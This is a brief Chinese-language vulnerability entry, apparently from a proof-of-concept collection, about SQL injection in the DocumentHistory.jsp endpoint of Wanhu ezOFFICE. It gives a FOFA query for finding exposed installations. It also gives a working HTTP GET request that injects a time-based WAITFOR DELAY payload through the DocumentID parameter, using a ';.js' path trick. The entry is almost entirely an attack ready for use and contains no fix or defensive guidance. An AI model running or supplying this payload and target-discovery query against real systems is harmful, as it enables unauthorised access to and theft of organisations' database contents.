## 万户 ezOFFICE DocumentHistory.jsp SQL注入

DocumentHistory.jsp接口处存在sql注入漏洞，攻击者可获取数据库中敏感信息

## fofa
```
app="ezOFFICE协同管理平台"
```

## poc
```
GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
```

